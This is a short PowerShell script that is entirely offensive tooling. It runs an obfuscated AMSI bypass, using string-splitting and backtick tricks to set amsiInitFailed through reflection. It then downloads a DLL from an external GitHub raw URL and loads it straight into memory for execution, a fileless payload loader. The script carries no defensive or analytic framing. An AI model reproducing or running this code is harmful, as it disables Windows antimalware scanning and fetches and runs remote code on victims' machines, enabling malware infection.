Start-Sleep -Seconds 5

# Obfuscation to bypass AMSI
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    
(Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

Start-Sleep -Seconds 5

# Download and load the DLL into memory
$data = (New-Object System.Net.WebClient).DownloadData('https://raw.githubusercontent.com/ingramali/1111111111111111111/main/windows.dll')
$assem = [System.Reflection.Assembly]::Load($data)

# List all types in the loaded assembly to inspect what is available
#$assem.GetTypes()

# Uncomment the following lines to invoke a method in one of the discovered types
# $type = $assem.GetType("Namespace.ClassName")
# $method = $type.GetMethod("MethodName")
# $method.Invoke($null, $null)
